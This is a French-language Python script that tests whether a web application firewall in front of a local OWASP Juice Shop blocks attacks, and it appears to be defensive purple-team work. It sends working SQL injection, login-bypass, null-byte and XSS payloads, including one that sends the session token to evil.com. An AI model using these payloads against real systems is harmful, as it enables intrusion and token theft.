#!/usr/bin/env python3
"""
purple_team_validation.py — Validation des défenses Blue Team
Cible WAF : http://localhost:8080  (Juice Shop derrière WAF)
Cible brute: http://localhost:3000 (Juice Shop sans WAF — comparaison)

Usage : python3 purple_team_validation.py [--waf http://localhost:8080]
"""

import urllib.request, urllib.parse, json, sys, time, argparse

# ── Couleurs ─────────────────────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"; W = "\033[0m"

def ok(msg):   print(f"  {G}✅ PASS{W}  {msg}")
def fail(msg): print(f"  {R}✗ FAIL{W}  {msg}")
def info(msg): print(f"  {C}ℹ  {W}     {msg}")

results = {"pass": 0, "fail": 0}

def http_code(url, method="GET", body=None, headers=None):
    """Retourne le code HTTP d'une requête."""
    h = headers or {"Content-Type": "application/json"}
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=8)
        return resp.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

def test(nom, url, method="GET", body=None, headers=None,
         expect_block=True, expect_code=403, note=""):
    """Lance un test et affiche le résultat."""
    code = http_code(url, method, body, headers)
    blocked = code in (400, 403, 429)

    if expect_block:
        if blocked:
            ok(f"{nom} → HTTP {code} (bloqué)")
            results["pass"] += 1
        else:
            fail(f"{nom} → HTTP {code} attendu 403/400/429 (non bloqué !)")
            if note:
                info(f"Note : {note}")
            results["fail"] += 1
    else:
        if code == expect_code:
            ok(f"{nom} → HTTP {code} (trafic légitime passé)")
            results["pass"] += 1
        else:
            fail(f"{nom} → HTTP {code} attendu {expect_code} (faux positif !)")
            results["fail"] += 1

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--waf",  default="http://localhost:8080",
                        help="URL Juice Shop derrière WAF")
    parser.add_argument("--raw",  default="http://localhost:3000",
                        help="URL Juice Shop sans WAF (comparaison)")
    args = parser.parse_args()

    W_URL  = args.waf.rstrip("/")
    R_URL  = args.raw.rstrip("/")

    print(f"""
{Y}╔══════════════════════════════════════════════════════╗
║   🟣 Purple Team — Validation des défenses Blue Team  ║
║   WAF  : {W_URL:<42}║
║   Brut : {R_URL:<42}║
╚══════════════════════════════════════════════════════╝{W}
""")

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 1 : SQLi (VULN-01 et 02) ──────────────────────{W}")

    test("SQLi UNION search (WAF)",
         f"{W_URL}/rest/products/search?q=test')) UNION SELECT 1,2,3,4,5,6,7,8,9--",
         expect_block=True,
         note="WAF-001 doit bloquer le pattern UNION SELECT")

    test("SQLi time-based RANDOMBLOB (WAF)",
         f"{W_URL}/rest/products/search?q=test')) AND LIKE(CHAR(65),UPPER(HEX(RANDOMBLOB(500000000/2))))--",
         expect_block=True,
         note="WAF-005 doit bloquer RANDOMBLOB")

    test("SQLi login bypass (WAF)",
         f"{W_URL}/rest/user/login",
         method="POST",
         body={"email": "admin@juice-sh.op'--", "password": "x"},
         expect_block=True,
         note="WAF-002 doit bloquer l'apostrophe+commentaire dans le body")

    # Vérifier que sans WAF, la même attaque passe
    code_raw = http_code(f"{R_URL}/rest/user/login",
                         method="POST",
                         body={"email": "admin@juice-sh.op'--", "password": "x"})
    if code_raw == 200:
        info(f"Sans WAF → HTTP {code_raw} (bypass réussi — WAF nécessaire ✓)")
    else:
        info(f"Sans WAF → HTTP {code_raw}")

    print()

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 2 : FTP Null Byte (VULN-04) ───────────────────{W}")

    test("FTP null byte %2500 (WAF)",
         f"{W_URL}/ftp/coupons_2013.md.bak%2500.md",
         expect_block=True,
         note="WAF-003 doit bloquer %2500 dans l'URI")

    test("FTP fichier .md légitime (WAF)",
         f"{W_URL}/ftp/acquisitions.md",
         expect_block=False,
         expect_code=200)

    print()

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 3 : XSS Stocké (VULN-05) ──────────────────────{W}")

    # Obtenir un token valide pour les tests authentifiés
    token = None
    try:
        data = json.loads(
            urllib.request.urlopen(
                urllib.request.Request(
                    f"{W_URL}/rest/user/login",
                    data=json.dumps({"email":"admin@juice-sh.op","password":"admin123"}).encode(),
                    headers={"Content-Type":"application/json"},
                    method="POST"
                ), timeout=8
            ).read().decode()
        )
        token = data.get("authentication", {}).get("token")
        if token:
            info(f"Token admin obtenu pour tests authentifiés")
    except Exception as e:
        info(f"Login direct échoué via WAF ({e}) — tests XSS avec token vide")

    xss_headers = {"Content-Type": "application/json"}
    if token:
        xss_headers["Authorization"] = f"Bearer {token}"

    test("XSS <script> dans review (WAF)",
         f"{W_URL}/rest/products/1/reviews",
         method="PUT",
         body={"message": '<script>fetch("http://evil.com/?t="+localStorage.token)</script>',
               "author": "purple_team_test"},
         headers=xss_headers,
         expect_block=True,
         note="WAF-004 doit bloquer la balise <script>")

    test("XSS onerror dans review (WAF)",
         f"{W_URL}/rest/products/1/reviews",
         method="PUT",
         body={"message": '<img src=x onerror=alert(1)>', "author": "purple_team_test"},
         headers=xss_headers,
         expect_block=True,
         note="WAF-004 doit bloquer onerror=")

    test("Review légitime (WAF)",
         f"{W_URL}/rest/products/1/reviews",
         method="PUT",
         body={"message": "Great product! Very tasty juice.", "author": "happy_customer"},
         headers=xss_headers,
         expect_block=False,
         expect_code=200)

    print()

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 4 : Trafic légitime (faux positifs) ───────────{W}")

    test("Recherche produit normale",
         f"{W_URL}/rest/products/search?q=apple+juice",
         expect_block=False, expect_code=200)

    test("Recherche avec apostrophe naturelle",
         f"{W_URL}/rest/products/search?q=mother%27s+recipe",
         expect_block=False, expect_code=200)

    test("Page d'accueil",
         f"{W_URL}/",
         expect_block=False, expect_code=200)

    test("API produits",
         f"{W_URL}/api/Products",
         expect_block=False, expect_code=200)

    print()

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 5 : Rate Limiting (brute force) ────────────────{W}")

    info("Test rate limiting login (6 tentatives rapides)...")
    blocked_count = 0
    for i in range(6):
        code = http_code(f"{W_URL}/rest/user/login",
                         method="POST",
                         body={"email": f"test{i}@test.com", "password": "wrong"})
        if code == 429:
            blocked_count += 1
        time.sleep(0.1)

    if blocked_count > 0:
        ok(f"Rate limiting actif — {blocked_count}/6 requêtes bloquées (HTTP 429)")
        results["pass"] += 1
    else:
        fail(f"Rate limiting inactif — 0/6 requêtes bloquées")
        results["fail"] += 1

    print()

    # ─────────────────────────────────────────────────────────────────────────
    print(f"{Y}── BLOC 6 : Headers de sécurité ───────────────────────{W}")

    info("Vérification des headers de sécurité sur la réponse WAF...")
    try:
        resp = urllib.request.urlopen(f"{W_URL}/", timeout=8)
        headers = dict(resp.headers)
        required = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Content-Security-Policy",
        ]
        for h in required:
            val = headers.get(h, headers.get(h.lower(), None))
            if val:
                ok(f"Header {h}: {val[:50]}")
                results["pass"] += 1
            else:
                fail(f"Header manquant : {h}")
                results["fail"] += 1
    except Exception as e:
        fail(f"Impossible de vérifier les headers : {e}")
        results["fail"] += 1

    # ─────────────────────────────────────────────────────────────────────────
    total = results["pass"] + results["fail"]
    taux  = round(results["pass"] / total * 100) if total else 0

    print(f"""
{Y}╔══════════════════════════════════════════════════════╗
║   RÉSULTATS PURPLE TEAM                              ║
╠══════════════════════════════════════════════════════╣
║   Tests réussis  : {G}{results["pass"]:>2}{Y} / {total}                             ║
║   Tests échoués  : {R}{results["fail"]:>2}{Y}                                     ║
║   Score défense  : {G if taux >= 80 else R}{taux:>3}%{Y}                                  ║
╚══════════════════════════════════════════════════════╝{W}
""")
    if taux >= 90:
        print(f"  {G}🛡️  Défenses très efficaces — risque résiduel FAIBLE{W}\n")
    elif taux >= 70:
        print(f"  {Y}⚠️  Défenses partielles — ajuster les règles WAF{W}\n")
    else:
        print(f"  {R}🚨 Défenses insuffisantes — revoir la configuration{W}\n")

    sys.exit(0 if results["fail"] == 0 else 1)

if __name__ == "__main__":
    main()
